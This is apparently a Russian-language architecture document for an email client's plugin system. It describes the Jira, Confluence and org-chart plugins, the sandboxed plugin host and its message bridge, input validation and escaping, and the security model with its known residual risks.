Capabilities (все main-window-only — ctx.authorizeMain() в начале invoke): jira.status, jira.verify, jira.myIssues, jira.reportedIssues (обе роли: открытые обращения, где reporter = currentUser() — заведённые самим пользователем; в интерфейсе — вкладка «Мои обращения» у руководителя и ссылка «Заведённые мной →» у исполнителя), jira.issue (key по ISSUE_KEY_RE), jira.transitions, jira.transition (transitionId — ^\d{1,10}$), jira.comment (тело ≤ 20 000 символов), jira.assign (assignee: 'me' — в любой роли; логин или null = снять — только руководитель), jira.team, jira.teamIssues (assignee: '' = неназначенные; status = срез очереди по статусу) и jira.dashboard (период 7/30, проект только из настроенных — ADR-0062) — только руководитель (requireManager, иначе auth), jira.setRole (плагин меняет своё не-секретное значение role через deps.writeValues), jira.issueTypes/jira.create (создание обращения; требуют настроенных проектов — иначе not_connected; проект только из настроенных (scopedProjects), тип из createmeta, тема ≤ 255, описание ≤ 30 000), jira.open (URL <base>/browse/<key> строит main → ctx.openExternal → safeOpenExternal), jira.openFromMessage (hostOnly, только через plugin:hostAction).

JQL строится только из проверенных частей: ключи проектов — ^[A-Z][A-Z0-9_]{0,31}$, строки — jqlString() (экранирование \\ и ", срез control-символов), ключ обращения — ISSUE_KEY_RE. Руководитель (teamJql): assignee in membersOf("группа") и/или assignee in ("логины") (скобки и OR — когда заданы оба) AND statusCategory != Done [AND project in (…)] ORDER BY updated ASC; без группы и логинов — ошибка not_connected с подсказкой. Введённое разбирает issueKeyOf — номер в любом регистре или вставленная ссылка на обращение (/browse/HD-1234, с хвостом и якорем); всё остальное честно отклоняется подсказкой, без похода в сеть. Дальше обычный jira.issue + jira.transitions — новых возможностей в манифесте не появилось. Ответ 404 Jira даёт и на «нет такого», и на «нет доступа» (она их намеренно не различает) — карточка так и говорит, обоими вариантами сразу. Под таблицей «Очередь» и под верхним рядом дашборда — раскрывающийся блок «Выборка (JQL)» с точным запросом (JiraTeamOverview.jql, JiraDashboard.jql): его можно вставить в поиск Jira и сравнить списки с другими инструментами (например, с отчётами Jira, которые считают все открытые обращения проекта без исключений по типам).

Встроенный Confluence (com.outtalk.confluence, ADR-0070)

Корпоративная база знаний рядом с почтой — то же Server/DC-семейство, что и Jira: Personal Access Token пользователя (аватар → Настройки → Personal Access Tokens), тот же XSRF-фильтр Atlassian, тот же keychain. Плагин делает две вещи, которые почтовый клиент реально может дать вики: находит страницы, о которых письмо, и сохраняет письмо страницей.

Настройки: baseUrl (url; корень Confluence, часто с /confluence), authMode (choice «Токен · Логин и токен», bearer|basic, по умолчанию bearer), username (строка видна только при authMode = basic), token (secret), spaceKey (под «Дополнительно»; пространство по умолчанию, ^~?[A-Za-z0-9_]{1,255}$ — личное пространство ~user тоже допустимо), parentId (под «Дополнительно»; числовой pageId родителя, необязательно). В каждое из трёх не-секретных полей можно вставить ссылку из браузера: normalizeValues оставит от неё корень сервера, ключ пространства или pageId (ADR-0071); что разобрать не вышло — строка отвергает ввод с примером, а не словом «некорректно». readConfluenceConfig() перепроверяет https:// в точке использования, а не только при сохранении (ADR-0064). «Проверить» → confluence.verify → «Подключено: Иванов Иван; пространство «Департамент ИТ» доступно».

Клиент (builtin/confluence/client.ts): GET /rest/api/user/current, GET /rest/api/space (≤ 50 на страницу, всего ≤ 200; личные пространства в конце списка), GET /rest/api/content/search?cql=…&expand=space,version, GET /rest/api/content/<id> (для читалки — expand=body.view,space,version,ancestors,children.page), GET /rest/api/space/<key>/content/page?depth=root и GET /rest/api/content/<id>/child/page (дерево, MAX_PAGE = 50 на уровень), POST /rest/api/content. Через net.fetch (системный прокси), Authorization: Bearer либо Basic, X-Atlassian-Token: no-check + собственный User-Agent, redirect: 'error', credentials: 'omit', таймаут 15 с включая чтение тела, тело — потоково с потолком 8 МБ (общий util/bounded-body.ts, тот же, что у Jira-клиента). Отдельный путь — image(): без X-Atlassian-Token: no-check (опт-аут из XSRF-фильтра нужен REST-вызовам, а не статике), только свой хост и только белый список путей, потоковый потолок 2 МБ через readBoundedBytes из того же util/bounded-body.ts (Безопасность). Ошибки → ConfluenceApiError (401/403 → auth, 404 → not_found, иначе network) с коротким текстом без HTML; text/html в ответе 200 → «Confluence вернул не JSON — проверьте адрес». Адрес страницы строит main из baseUrl и числового id (CONTENT_ID_RE = /^\d{1,19}$/) — ссылка из ответа сервера не используется нигде, в том числе в confluence.open.

CQL собирается только из проверенных частей: ключ пространства — SPACE_KEY_RE, строки — cqlString() (экранирование \ и ", срез control-символов), а пользовательская фраза для оператора ~ проходит cqlTerm() — он вырезает Lucene-операторы (*, ?, ~, ^, кавычки, скобки, булевы знаки) и обрезает фразу до 200 символов. Без этого тема письма вроде «RE: доступ (VPN)*» роняла бы запрос в 400. Поиск: type = page AND text ~ "…" [AND space = "…"] order by lastmodified desc; «мои недавние»: type = page AND contributor = currentUser() … .

Capabilities (все main-window-only — ctx.authorizeMain() в начале invoke): confluence.status (ConfluencePluginStatus без токена), confluence.verify, confluence.spaces, confluence.search, confluence.recent, confluence.tree и confluence.content (дерево и чтение страницы, ADR-0072), confluence.openLink (внешняя ссылка со страницы), confluence.open (URL строит main → ctx.openExternal → safeOpenExternal), confluence.pending/confluence.publish/confluence.discard (работа с черновиком письма), confluence.resolveLink («это моя страница?», ADR-0107, см. ниже) и host-only confluence.prepareFromMessage (только через plugin:hostAction).

Своя ссылка и своя страница по просьбе другого плагина (ADR-0107). Манифест объявляет contributes.links = { capability: "confluence.resolveLink" }, и хост спрашивает эту возможность про любой вставленный адрес. Обработчик узнаёт только свой сервер (адрес обязан начинаться с <baseUrl>/ из настроек) и только форму с идентификатором — ту же, что понимает normalizeContentId в настройках (ADR-0071): …/pages/viewpage.action?pageId=… и …/pages/<id>/Заголовок. Адрес /display/ПРОСТРАНСТВО/Заголовок идентификатора не содержит — из него ничего не выдумывается, ответ null. Заголовок берётся у сервера (GET /rest/api/content/<id>), чтобы во вложении задачи стояло имя страницы, а не голый номер; сервер не ответил или страницы нет — тоже null. Обратная дорога — хук openItem(key, ctx): он открывает страницу разделом в окне приложения (ctx.openPluginWindow({ pageId }) → читалка сразу на этой странице, ADR-0105), а ctx.openExternal(pageUrl(baseUrl, id)) остаётся запасным путём, если окно раздела показать нечем.

Письмо → страница: одноразовый черновик в main

Публикация письма требует тела письма, а у плагинов его не было: messageActions передают только { accountId, messageId, subject, from, date } (ADR-0058), и общей возможности «читай почту» нет и не появилось. Поэтому тело не пересекает границу плагина вообще:

  1. Пользователь жмёт «Сохранить в Confluence» в тулбаре письма → plugin:hostAction → host-only confluence.prepareFromMessage. Main валидирует снимок (messageSource), авторизует аккаунт письма и сам читает письмо: зависимость readMessage обработчика, за которой в ipc/plugins.ts стоит resolveProvider(accountId).getMessage(id). Провайдер в обработчик не передаётся.
  2. Тело расплющивается в plain text (storage.ts → htmlToPlainText) и остаётся в main как одноразовый черновик: { accountId, messageId, text, attachments, … }. Плагин получает только дескриптор ConfluenceDraft { id, title, from, to, date, length, spaceKey, parentId } — ни текста, ни messageId. Он же уходит во фрейм как hostEvent: open вместе с query (тема, прогнанная через cqlTerm), поэтому раздел сразу показывает и форму, и похожие страницы.
  3. Фрейм показывает форму (заголовок, пространство, родитель) и по «Создать страницу» зовёт confluence.publish { id, title, spaceKey, parentId }. Main достаёт текст по id, собирает storage format, создаёт страницу и удаляет черновик: повторная публикация (двойной клик, переигранное сообщение фрейма) отвечает not_found. Черновик один на плагин и живёт 30 минут.
  4. На публикации аккаунт авторизуется повторно (ctx.authorizeAccount(draft.accountId)): черновик готовил доверенный хост, а публикацию зовёт фрейм, и окно за это время могло смениться.
  5. Выключение плагина и перезапись его настроек гасят черновик: ipc/plugins.ts зовёт необязательный BuiltinPluginHandler.forget(), так что текст письма не ждёт в памяти main своего TTL.

Storage format. Письмо публикуется как текст, а не как исходный HTML: storage format — строгий XHTML, который Confluence отвергает с 400 на любом непарном теге, а почтовый HTML произволен и полон трекинг-пикселей. htmlToPlainText — теперь тонкая обёртка над общим util/html-text.ts → htmlToText(html, max) (ADR-0072): своей regex-машины у него больше нет, письмо и страница вики разбираются одним токенайзером, с одним списком скрываемых контейнеров (script/style/head/noscript/svg/iframe/form/object/template — выбрасываются целиком вместе с содержимым), одной таблицей сущностей и одним классом управляющих символов (CONTROL_CHARS_RE, им же чистит xmlEscape). Разбор линейный по входу (ленивые [\s\S]*? и <[^>]*> давали квадратичный откат на письме-ловушке и на десятки секунд замораживали main вместе со всеми окнами; токенайзер идёт indexOf-проходом и не откатывается), блочные теги становятся переводами строк, <td>/<th> — табуляциями, результат обрезается до 100 000 символов; messagePageStorage собирает страницу из экранированных (xmlEscape) значений: таблица конверта (От/Кому/Дата/Тема) + абзацы + список вложений (они перечисляются, но не переносятся). Ничего из письма не попадает на страницу неэкранированным.

Дерево пространства и чтение страницы в клиенте (ADR-0072)

Раздел — это база знаний, а не строка поиска: слева дерево пространства, справа сама страница.

  • Дерево строит сервер. confluence.tree без parentId — корни пространства (/rest/api/space/<key>/content/page?depth=root, с откатом на домашнюю страницу пространства), с parentId — дети страницы (/rest/api/content/<id>/child/page). ConfluenceTreeNode.hasChildren берётся из expand=children.page; если сервер его не развернул, узел считается раскрываемым — лучше открыть и показать пустоту, чем спрятать поддерево. Уровень ограничен MAX_PAGE = 50, и обрезка выражена в контракте: возвращается ConfluenceTree { nodes, truncated } (симметрично ConfluenceSearchResult), а кадр подписывает «Показаны первые N страниц уровня». Поиск и «Недавние» (confluence.recent) показываются в той же панели с кнопкой «К дереву». Аргумент пространства у всех возможностей называется одинаково — spaceKey.
  • Страница приезжает блоками, а не разметкой. confluence.content берёт body.view, а view-doc.ts разбирает его в ConfluenceBlock[] (заголовки, абзацы, цитаты, код, списки с уровнем, таблицы, картинки, разделители) с инлайн-прогонами ConfluenceInline { text, bold?, italic?, code?, href?, pageId? }. Кадр строит DOM через createElement/textContent — HTML-строка во фрейм не передаётся никогда, поэтому разметка вики физически не может исполниться. Разбор линейный и ограниченный (2 МБ разметки, 2000 блоков, 200 000 символов, 200 строк таблицы), при обрезке — truncated: true и подпись «показано начало страницы».
  • Ссылки решает main: только http(s), абсолютные; ссылка внутрь этой же вики несёт pageId и открывается в читалке, внешняя уходит в confluence.openLink → ctx.openExternal. Кнопка «Открыть в браузере» осталась вторым действием.
  • Картинки забирает main токеном пользователя и отдаёт data:-URL (CSP кадра разрешает img-src 'self' data:). Только изображения этого же сервера и только по белому списку путей (/download/, /images/, /rest/api/content/, плейсхолдеры плагинов) — иначе <img> на чужой странице превратился бы в авторизованный GET к произвольному эндпоинту от имени читателя; заголовок X-Atlassian-Token: no-check на этот запрос не ставится. Внешняя картинка — трекер, запрос к ней не делается вовсе. Потолки: 2 МБ на картинку, 6 МБ на страницу, ≤ 5 загрузок одновременно, дедлайн 20 с; типы — белый список image/*, включая image/svg+xml (под CSP кадра SVG в data:-картинке рисуется, но не исполняется). Что не забрали — текстовая пометка «Изображение доступно в браузере», а не битая картинка. Полностью — Безопасность → Та же политика для страницы вики.

Интерфейс плагина — статический dist/ без сети и зависимостей, DOM только через textContent/value: слева поиск, выбор пространства и дерево, справа читалка с хлебными крошками (кликабельными) и телом страницы; поверх — карточка «Письмо → страница» и плашка о созданной странице. Раскладка занимает кадр целиком (ADR-0073): main на всю высоту, рабочая область — грид minmax(210px, 290px) minmax(0, 1fr), обе панели прокручиваются сами (.pane { overflow: auto }), поиск и выбор пространства прилипают к верху дерева (.tree-top), подпись раздела прячется при открытой странице (body.reading), кнопка «Скрыть список» (#pane-toggle в шапке статьи) складывает левую панель вместе с поиском и отдаёт статье всю ширину (body.tree-hidden), сама статья — центрированная колонка до 1100 px, текстовые блоки внутри не шире 95ch (таблицы, код и картинки — по ширине колонки). Базовое правило [hidden] { display: none !important } — чтобы классы с собственным display не переигрывали атрибут hidden: из-за этого плашка «страница создана» (.created { display: flex }) висела всегда, а узел дерева (ul { display: grid }) не сворачивался. Любая смена настроек возвращает раздел в исходный вид (closeReader() в начале boot(): снимает reading/tree-hidden, закрывает читалку) — открытая страница принадлежит прежнему серверу. dataChanged (сохранили настройки) → повторный boot() во фрейме (кадр не перезагружается, состояние DOM переживает событие); theme — смена темы хоста; open до ui.ready откладывается хостом.

Встроенная «Структура компании» (com.outtalk.orgchart, ADR-0113)

Раздел «Структура» показывает оргструктуру компании — подразделения, их руководителей и команды — из корпоративного каталога почтового сервера. Это четвёртый встроенный плагин; в отличие от Jira и Confluence, ему не нужны ни свой сервер, ни токен: он читает каталог через подключённый ящик, с правами самого человека. Поэтому у манифеста нет contributes.settings — в «Настройки → Плагины» только тумблер, и, как любой плагин, раздел выключен по умолчанию (ADR-0064).

Обход каталога (crawl.ts)

Exchange не отдаёт список всех сотрудников — только карточку по адресу. Зато в каждой карточке есть руководитель и прямые подчинённые, и по ним проходится вся компания.

  1. Старт. Обработчик сначала читает карточку владельца ящика — она даёт self (корень «я»). Обход начинается с start, а без него — с self; каталог не знает владельца и start не задан → ошибка «Каталог не знает владельца ящика — начать обход не с кого».
  2. Вверх — последовательно. По полю manager до вершины: цепочка короткая, параллелить нечего. Предел MAX_CHAIN = 64 и множество уже пройденных адресов — страховка от круга в каталоге («А подчиняется Б, Б подчиняется А»).
  3. Вниз — в ширину, от вершины. Общая очередь и CONCURRENCY = 3 потока (кламп 1…8): Exchange ограничивает частоту запросов, и обход не должен мешать почте. Пустая очередь — ещё не конец: поток выходит, только когда очередь пуста и inFlight === 0 (иначе соседний поток мог как раз нести подчинённых, и параллельность таяла бы на старте); до тех пор он ждёт по 5 мс.
  4. Предел. DEFAULT_LIMIT = 2000 людей, кламп к потолку MAX_PEOPLE = 5000; в очередь попадает не больше limit × 2 адресов. Порядок результата задаёт обход от вершины (order), а не порядок ответов сервера: при обрезке остаётся верх компании, а не цепочка от стартового человека вверх. truncated — очередь не пуста и предел достигнут.
  5. Один запрос на адрес. found/missing — второй раз одного человека не спрашивают.
  6. Отказы. Исключение lookup — failed += 1, адрес уходит в missing, обход продолжается, но с паузой: 200 мс, дальше вдвое до потолка 5 с; удача паузу сбрасывает. Обход останавливается в трёх случаях: код отказа auth, network или not_connected — доступ или сеть отвалились целиком; 10 отказов подряд — сервер начал ограничивать частоту, и это может случиться и после тысячи успешных карточек; failed ≥ 20 и failed > найдено — не приходит почти ничего. Лимит частоты EWS считается на пользователя, то есть обход тратит тот же запас, что и почта этого человека, — долбить отказывающий сервер нельзя.
  7. Отмена проверяется перед каждым запросом; отменённый обход ничего не пишет на диск.
  8. Итог. Пустой результат — ошибка «Каталог не вернул ни одного человека». Ошибки в OrgState.error попадают только текстом MailError, прочее — обобщённым «Не удалось обойти каталог»; подробности — в журнал logWarn. В любом исходе обработчик зовёт onChanged() → announcePluginChange → кадр получает hostEvent: dataChanged. Пока обход идёт, кадр опрашивает org.state каждые 500 мс и показывает счётчик найденных.

toOrgPerson(card) превращает DirectoryPerson в OrgPerson: адреса — в нижнем регистре, строковые поля — trim() и ≤ 256 символов, пустые опускаются, reports ≤ 500. Телефоны отбрасываются здесь, до записи на диск (§4 ADR).

Правила и построение (structure.ts)

Правила — объект OrgRules, который человек правит в разделе с живым предпросмотром; каждое изменение перестраивает дерево из уже собранных людей, без похода в сеть.

export const DEFAULT_RULES: OrgRules = {
  version: 1,
  mode: 'managers',
  root: { kind: 'top' },
  levels: [{ field: 'department', label: 'Подразделение' }],
  renames: [],
  headWords: ['директор', 'руководитель', 'начальник', 'head', 'director', 'chief', 'lead'],
  exclude: { addressContains: [], withoutDepartment: false }
}

Правила приходят из кадра, то есть извне, поэтому validRules(value) приводит их к доверенной форме и никогда не бросает: незнакомое отбрасывается, негодное поле берёт значение по умолчанию. Пределы: уровней ≤ 8, переименований ≤ 500, слов главы ≤ 50, срезаемых кусков на уровень ≤ 20, исключений ≤ 100, любой текст ≤ 200 символов, подпись уровня ≤ 60, разделитель ≤ 10, номера частей 1…20 (to < from отбрасывается), поле уровня — только company | department | office | title. Пустой список уровней → уровень по умолчанию. Корень person принимается только с адресом, содержащим @, иначе — top. Слова главы и фрагменты исключений приводятся к нижнему регистру.

Регулярных выражений нет намеренно (§3 ADR): неудачное выражение на тысячах записей зависает катастрофически, а считаются правила в main — вместе с ним встала бы почта. Разбор поля уровнем (segments) — это последовательность простых операций:

  1. значение поля (trim, ≤ 512 символов);
  2. разрез по split — одно поле становится несколькими уровнями («Департамент / Отдел» — два шага); число частей ограничено в самом разрезе (split(sep, 20)): разделитель «о» на длинном поле иначе дал бы сотни кусков;
  3. срез частей parts: { from, to? } (с единицы, to не задан — до конца);
  4. strip — снять приставки и хвосты без учёта регистра, «пока снимается»: за проход снимается один кусок, проходов не больше 10;
  5. переименование — точное совпадение без учёта регистра и пробелов по краям (при нескольких правилах на одно написание побеждает первое).

Правила готовятся один раз на построение (prepare(rules)): переименования — в Map по ключу в нижнем регистре, срезаемые куски каждого уровня — заранее в нижнем регистре. Это не оптимизация «на всякий случай»: предпросмотр дёргает org.structure каждые 250 мс, считается в main и блокирует его целиком. Первая версия сравнивала каждую часть со всеми переименованиями подряд и резала поле без предела частей — на пяти тысячах людей с неудачными правилами держала main 1,3 с, а на полях, набитых разделителями, — 16,4 с; это тот же риск, что и у регулярных выражений, только пришедший другой дорогой. По той же причине путь человека в режиме fields ограничен MAX_PATH = 16 ступенями, даже если разрез на всех уровнях сразу дал бы больше.

Отбор людей. Сначала исключения: фрагмент адреса (без учёта регистра) и «без отдела». Затем корень: top — все; me — ветка self; person — ветка этого человека. Ветка — обход в ширину по reports с защитой от кругов и потолком MAX_PEOPLE.

Режим managers — подразделение = руководитель и его ветка.

  • Вершины — люди, у которых руководителя нет или он вне выбранного круга (при заданном корне — сам корень).
  • У руководителя подчинённые, у которых есть свои подчинённые в круге, становятся дочерними подразделениями; остальные — members. id подразделения — m:<адрес главы>.
  • Имя берётся из первого уровня правил по карточке главы, и это то, что подразделение добавляет к родителю: под «Департаментом ИТ» стоит «Отдел разработки», а не «Департамент ИТ / Отдел разработки». Совпало с родителем целиком (или поля нет) — это команда внутри того же подразделения: уровень «Команда», имя — по человеку.
  • Люди из кругов подчинения не теряются: кого не достала ни одна вершина, тот становится новой вершиной — начиная с человека, у которого больше всего подчинённых.

Режим fields — вложенность по уровням.

  • Путь человека — сегменты всех уровней подряд (≤ 16 ступеней); подразделения вкладываются по именам сегментов (id — f/<имя>/<имя>…). Человек без единого сегмента попадает в unplaced — не пропадает молча.
  • Глава — человек со словом из headWords в должности; из нескольких таких — тот, чей руководитель вне подразделения (остальные — его заместители внутри); словами никто не отмечен — тот, чей руководитель снаружи, а подчинённые внутри.

В обоих режимах total считается снизу вверх (глава + состав + дети), подразделения и люди сортируются по имени с русской локалью, count — число людей в выбранном круге, people — только упомянутые люди.

PluginHost: chrome + relay

src/renderer/src/components/plugins/PluginHost.tsx — доверенный хост плагина. Он рисует drag-титлбар (кнопки окна — нативный оверлей ОС, см. Интерфейс → Кастомный titlebar; в титлбаре стоит <TopStripSlot home="page" edge />, поэтому напоминание о встрече показывается и на странице плагина — ADR-0056) и под ним — sandbox-iframe, а также ретранслирует postMessage.

Почему chrome принадлежит хосту. Drag-титлбар рисует хост, а кнопки окна — нативный оверлей ОС (вне iframe); плагину отдан только прямоугольник контента — защита от clickjacking (плагин не может подделать ни титлбар, ни элементы управления окном).

Пока фрейм не готов — скелетон хоста. loading в PluginHost держится от монтирования до ui.ready от плагина, и всё это время поверх iframe (absolute inset-0, непрозрачный bg-background) стоит PluginSkeleton — нейтральная заглушка «панель инструментов + список»: iframe до первой отрисовки белый/пустой, а это читается как сломанный раздел. Плашка рисуется хостом, а не плагином, — как и остальной chrome (ADR-0075, Интерфейс → Состояния загрузки).

Размер этого прямоугольника — весь остаток окна: шапка 64 px, под ней <iframe className="size-full border-0"> без отступов. Значит, поля по краям раздела, внешнюю прокрутку и «пустое место» рисует сам плагин своей вёрсткой — кадр надо верстать как окно приложения (html, body { height: 100% }, прокрутка внутри панелей), а не как веб-страницу с центрированной колонкой; разбор случая — ADR-0073.

Протокол моста (postMessage). Плагин и хост общаются сообщениями с меткой __outtalk:

  • Плагин → хост: { __outtalk: 'invoke', rid, cap, args } (parent.postMessage(..., '*')).
  • Хост → плагин: { __outtalk: 'result', rid, result }, где result — это Result<T>.
  • Хост → плагин (без запроса): { __outtalk: 'hostEvent', event: 'dataChanged' } — данные плагина изменились снаружи (например, «Добавить в задачи» в другом окне или сохранение настроек); плагин перечитывает своё состояние через обычный invoke. Отправляется postMessage(..., 'outtalk-plugin://<id>') и только активному фрейму этого плагина.
  • Хост → плагин (без запроса): { __outtalk: 'hostEvent', event: 'theme', payload: { theme } } — пользователь переключил тему приложения; фрейм ставит data-theme (при старте тема по-прежнему запрашивается через env.theme). Встроенному плагину, объявившему VIP-возможность (PLUGIN_VIP_CAPABILITIES), полезная нагрузка — { theme, vipLook: { vars, attrs } }: вид VIP из «Как выделять», прошедший белый список vipLookForFrame (ADR-0164, подробно — «Как выделять» в кадре). Событие шлётся и при смене темы, и при смене вида; остальные плагины получают прежнее { theme }.
  • Хост → плагин (без запроса): { __outtalk: 'hostEvent', event: 'vipChanged' } — в окне поменялся список VIP какого-либо ящика (ручной или из каталога, ADR-0159) или ручной список супер-VIP (ADR-0161); событие пустое, плагин переспрашивает todo.vipPeople. Шлётся только фрейму включённого встроенного плагина, чей манифест объявляет VIP-возможность (PLUGIN_VIP_CAPABILITIES), со склейкой 150 мс.
  • Хост → плагин (без запроса): { __outtalk: 'hostEvent', event: 'open', payload } — main попросил показать раздел плагина с данными (push plugin:open, например { issueKey } из действия у письма). AppShell переключает вид только на включённый плагин, usePlugins.pendingOpen держит payload до ui.ready, PluginHost отдаёт его ровно один раз (consumeOpen). Плагин, ещё не закончивший загрузку, откладывает payload до конца своего boot.

Валидация на приёме (критично для безопасности). Обработчик onMessage:

  1. e.source === iframe.contentWindow — сообщение только от этого фрейма.
  2. e.origin === 'outtalk-plugin://<id>' — чужой origin игнорируется.
  3. msg.__outtalk === 'invoke', typeof rid === 'number', typeof cap === 'string'.
  4. pluginId берётся из привязки хоста, а не из сообщения — плагин не может выдать себя за другой id.

Ответ отправляется прицельно на origin плагина: frame.contentWindow.postMessage({...}, origin).

Модель безопасности и остаточные риски

Что закрыто фундаментом и первым ToDo vertical slice:

  • Плагин изолирован по origin/sandbox/CSP: нет window.api, Node, DOM хоста, React-дерева.
  • Нет прямой сети (connect-src 'none', corsEnabled/supportFetchAPI: false).
  • Файлы отдаются только из dist/ плагина, анти-traversal, id привязан к папке.
  • Хост валидирует источник/origin сообщений и сам проставляет pluginId.
  • Брокер deny-by-default: обслуживаются только bundled-плагины с main-обработчиком под точным id (com.outtalk.todo, com.outtalk.jira, com.outtalk.confluence, com.outtalk.orgchart); секреты/креды/MailProvider не пересекают границу. Секреты плагинов (PAT Jira) лежат в plugin-secrets.json через safeStorage и читаются только main-обработчиком; renderer и фрейм видят лишь «сохранён/нет».
  • Код плагина не исполняется в main (реестр — чистые метаданные).
  • Chrome принадлежит хосту (анти-clickjacking).

Остаточные риски / открытое (адресуется в следующих фазах):

  • allow-same-origin необходим для реального origin и хранилища плагина, но означает, что скрипты плагина делят его sandbox-origin — приемлемо, пока origin отделён от хоста; ужесточение (например, отдельный процесс/utilityProcess) — Фаза 6.
  • (low, follow-up к Фазе 3) Плагин-фрейм не в выделенном partition/session. Все плагины и сам хост живут в session.defaultSession; отдельного partition="persist:plugin-<id>" у фреймов нет. Изоляцию хранилища и адресного пространства сейчас обеспечивает Chromium (site-isolation/OOPIF по origin outtalk-plugin://<id>), а не отдельная Electron-сессия. Осознанный пробел: без своей session у плагинов общий сетевой стек/кэш/куки-jar дефолтной сессии, а setPermissionRequestHandler навешен на defaultSession (различение идёт по origin, а не по сессии). Планово — выделенная per-plugin session/partition (в связке с capability-гейтингом прав), чтобы разграничение опиралось на границу сессии, а не только на origin.
  • Установка/удаление, доверие и целостность стороннего бандла (подпись, проверка источника) — Фаза 2; user plugin всё ещё кладётся в userData/plugins/ вручную. Любой плагин — и bundled, и из userData/plugins/ — выключен по умолчанию (ADR-0064): подброшенный в профиль каталог не получает раздела в NavRail и не исполняет код, пока пользователь не включит его тумблером в Настройках. Строки манифеста ограничены (name ≤ 80, version ≤ 32, section.label ≤ 80, section.id по ID_RE).
  • Общие права (grants) и UI согласия — Фаза 2–3; кроме закрытых в коде обработчиков bundled-плагинов (todo.*, jira.*, confluence.*, org.*), capabilities в манифесте остаётся только декларацией. contributes.settings и subjectPattern тоже принимаются только у bundled-плагинов — сторонний бандл формы в доверенных Настройках и regex над темами писем не получает.
  • Ресурсные лимиты (CPU/память фрейма), устойчивость к «зависшему» плагину — позже.
  • API v1 узкий и будет расширяться; контракт брокера — точка эволюции.

Пример: плагин Hello

examples/plugins/hello — самодостаточный, CSP-совместимый плагин, доказывающий изоляцию end-to-end. Манифест:

{
  "id": "com.outtalk.hello",
  "name": "Hello",
  "version": "1.0.0",
  "apiVersion": 1,
  "engines": { "outtalk": "^1.0.0" },
  "entry": "index.html",
  "capabilities": ["ui.section"],
  "contributes": { "section": { "id": "hello", "label": "Hello", "icon": "puzzle" } }
}

Бандл dist/: index.html (JS вынесен в файл — инлайн запрещён CSP), style.css, main.js — минимальный рантайм (то, что позже обернёт @outtalk/plugin-sdk):

function invoke(capability, args) {
  return new Promise((resolve) => {
    var rid = ++seq
    pending[rid] = resolve
    parent.postMessage({ __outtalk: 'invoke', rid, cap: capability, args: args || {} }, '*')
  })
}
// ...
outtalk.ready()                          // снимает скелетон хоста
outtalk.toast('Плагин Hello загрузился') // тост в приложении через мост

Сквозной поток Hello:

  1. Старт: loadPlugins() находит userData/plugins/com.outtalk.hello/plugin.json, кладёт в реестр.
  2. NavRail через usePlugins рисует секцию «Hello» (иконка puzzle), id = plugin:com.outtalk.hello.
  3. Клик → activeView = 'plugin:com.outtalk.hello' → AppShell рендерит PluginHost.
  4. PluginHost грузит outtalk-plugin://com.outtalk.hello/ → схема отдаёт index.html из dist/ с per-plugin CSP.
  5. main.js шлёт invoke('ui.ready') и invoke('ui.toast', {text}) → parent.postMessage.
  6. Хост валидирует источник/origin, обрабатывает обе возможности локально (скелетон снимается, всплывает тост) и отвечает { __outtalk: 'result', rid, result }.

Плагин ни разу не касается почты, window.api или сети — ровно то, что должна доказать Фаза 1.
